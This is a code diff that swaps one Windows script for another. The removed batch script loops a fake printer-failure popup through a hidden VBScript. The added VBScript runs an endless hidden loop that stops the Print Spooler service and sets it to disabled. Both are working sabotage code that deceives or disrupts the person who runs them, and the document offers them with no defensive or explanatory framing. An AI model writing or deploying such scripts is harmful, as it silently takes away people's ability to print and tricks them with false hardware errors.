@@ -1,22 +1,11 @@
-@echo off
-setlocal enabledelayedexpansion
+Set objShell = CreateObject("WScript.Shell")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
 
-set message="Your Printer HP Ink Tank 310 series has stopped working. Please check the shorted connection."
-set interval=10  REM Interval in seconds between each alert
+Do While True
+    ' Disable the Print Spooler service
+    objShell.Run "cmd /c net stop Spooler", 0, True
+    objShell.Run "cmd /c sc config Spooler start= disabled", 0, True
 
-:loop
-REM Create VBScript file with alert message
-echo Set objShell = CreateObject("WScript.Shell") > "%temp%\alert.vbs"
-echo objShell.Popup %message%, 0.5, "Alert", 64 + 4096 + 262144 >> "%temp%\alert.vbs"
-
-REM Run the VBScript in a hidden window
-start /min "" cscript //nologo "%temp%\alert.vbs"
-
-REM Delete the VBScript file after displaying the alert
-del "%temp%\alert.vbs" /f /q
-
-REM Delay for the specified interval
-timeout /t %interval% /nobreak >nul
-
-REM Loop back to display the alert again
-goto loop
+    ' Wait for 5 seconds
+    WScript.Sleep 5000
+Loop
